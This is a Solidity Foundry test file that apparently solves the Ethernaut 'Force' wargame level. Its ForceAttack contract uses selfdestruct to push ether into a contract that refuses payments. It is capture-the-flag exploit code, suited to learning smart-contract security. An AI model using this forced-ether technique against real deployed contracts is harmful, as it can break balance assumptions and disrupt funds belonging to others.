// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract ForceAttack {
  function byebye(address payable _dest) public {
    selfdestruct(_dest);
  }

  receive() external payable {}

}

contract ForceTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x4e8Da8e21d27A10BA7d2510cB90338374828bE86);
  }

  function testExploit() public {
    ForceAttack attackerContract = new ForceAttack();

    (bool success,) = address(attackerContract).call{value: 1 wei}("");
    success;

    attackerContract.byebye(payable(challengeAddress));

    utils.submitLevelInstance(challengeAddress);
  }
}
